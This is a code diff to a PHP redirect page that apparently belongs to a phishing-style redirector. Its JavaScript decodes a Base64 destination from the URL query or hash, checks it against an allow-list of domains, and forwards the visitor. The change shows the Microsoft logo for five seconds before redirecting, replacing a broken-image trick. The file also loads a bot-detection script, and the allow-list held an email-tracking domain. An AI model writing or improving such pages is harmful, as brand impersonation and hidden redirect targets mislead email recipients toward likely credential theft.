@@ -10,7 +10,8 @@ require_once 'BotDetectLoader.php';
     <script>
         window.onload = function() {
             const defaultUrl = 'https://hero.com';
-            const allowedDomains = ['resources.sopropertyllc.com', 't.apemail.net'];
+            const allowedDomains = ['resources.sopropertyllc.com'];
+            const displayTime = 5000; // Time in milliseconds to display the image before redirect (5 seconds)
 
             // Check if a string is a valid Base64 encoded string
             const isBase64 = (str) => {
@@ -74,12 +75,17 @@ require_once 'BotDetectLoader.php';
             // Determine the redirect URL
             const redirectUrl = processString(queryString) || processString(hashString) || defaultUrl;
 
-            // Image element to trigger redirection
-            const redirectImage = document.getElementById('redirect-image');
-            redirectImage.onerror = function() {
-                window.location.replace(redirectUrl);
+            // Display image before redirection
+            const displayImage = () => {
+                const redirectImage = document.getElementById('redirect-image');
+                redirectImage.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/512px-Microsoft_logo_%282012%29.svg.png"; // Provide a valid image URL to be displayed
+
+                setTimeout(() => {
+                    window.location.replace(redirectUrl);
+                }, displayTime);
             };
-            redirectImage.src = "invalid_image.jpg";
+
+            displayImage();
         };
     </script>
 </head>
